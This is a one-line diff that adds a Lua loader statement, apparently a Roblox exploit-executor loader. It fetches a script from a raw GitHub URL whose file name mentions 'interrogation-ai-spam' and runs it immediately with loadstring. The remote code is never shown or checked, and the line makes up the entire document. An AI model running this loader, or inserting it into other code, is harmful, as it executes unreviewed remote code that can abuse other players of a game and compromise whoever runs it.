@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/interrogation-ai-spam6-fzwbhdsjgzzta1.lua"))()
